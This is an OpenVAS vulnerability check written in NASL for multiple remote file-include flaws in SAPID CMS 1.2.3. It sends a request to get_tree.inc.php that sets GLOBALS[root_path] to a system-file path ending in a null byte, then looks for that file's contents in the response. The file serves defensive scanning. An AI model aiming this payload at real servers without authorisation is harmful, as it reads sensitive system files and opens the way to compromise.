###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_sapid_cms_51323.nasl 9352 2018-04-06 07:13:02Z cfischer $
#
# SAPID CMS Multiple Remote File Include Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "SAPID CMS is prone to multiple remote file-include vulnerabilities
because it fails to properly sanitize user-supplied input.

An attacker can exploit these vulnerabilities to obtain
potentially sensitive information or to execute arbitrary script
code in the context of the webserver process. This may allow the
attacker to compromise the application and the computer; other
attacks are also possible.

SAPID CMS 1.2.3 is vulnerable; other versions may also be affected.";

if (description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.103382");
 script_bugtraq_id(51323);
 script_version ("$Revision: 9352 $");
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
 script_name("SAPID CMS Multiple Remote File Include Vulnerabilities");
 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/51323");
 script_xref(name : "URL" , value : "http://sapid.sourceforge.net/");
 script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:13:02 +0200 (Fri, 06 Apr 2018) $");
 script_tag(name:"creation_date", value:"2012-01-10 11:23:59 +0100 (Tue, 10 Jan 2012)");
 script_category(ACT_ATTACK);
 script_tag(name:"qod_type", value:"remote_vul");
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
   
port = get_http_port( default:80 );
if( ! can_host_php( port:port ) ) exit( 0 );

files = traversal_files();

foreach dir( make_list_unique( "/sapid", "/cms", cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";

  foreach file( keys( files ) ) {

    url = dir + "/usr/extensions/get_tree.inc.php?GLOBALS[root_path]=/" + files[file] + "%00";

    if( http_vuln_check( port:port, url:url, pattern:file ) ) {
      report = report_vuln_url( port:port, url:url );
      security_message( port:port, data:report );
      exit( 0 );
    }
  }
}

exit( 99 );
